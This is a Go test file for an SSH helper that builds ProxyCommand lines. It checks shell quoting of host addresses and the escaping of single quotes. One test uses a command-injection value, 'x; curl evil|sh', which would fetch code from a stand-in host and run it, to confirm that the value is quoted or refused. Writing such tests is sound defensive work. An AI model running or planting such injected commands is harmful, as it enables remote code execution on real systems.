package sshx

import (
	"runtime"
	"testing"

	"github.com/northlighthq/boreal/internal/core/vault"
)

func TestProxyCommandLineQuotes(t *testing.T) {
	h := vault.Host{Address: "10.0.0.1", Port: 2222, Username: "me", Label: "web 1", ProxyCommand: "nc %h %p"}
	line, err := ProxyCommandLine(h)

	if err != nil {
		t.Fatal(err)
	}

	want := "nc '10.0.0.1' '2222'"

	if runtime.GOOS == "windows" {
		want = "nc 10.0.0.1 2222"
	}

	if line != want {
		t.Fatalf("got %q, want %q", line, want)
	}
}

func TestProxyCommandLineRejectsInjection(t *testing.T) {
	h := vault.Host{Address: "x; curl evil|sh", ProxyCommand: "nc %h %p"}
	line, err := ProxyCommandLine(h)

	if runtime.GOOS == "windows" {
		if err == nil {
			t.Fatalf("an unsafe address must be refused, got %q", line)
		}

		return
	}

	if err != nil {
		t.Fatal(err)
	}

	if line != "nc 'x; curl evil|sh' '22'" {
		t.Fatalf("the address must stay one quoted word, got %q", line)
	}

	h.Address = "a'b"

	if line, _ = ProxyCommandLine(h); line != `nc 'a'\''b' '22'` {
		t.Fatalf("quotes must be escaped, got %q", line)
	}
}
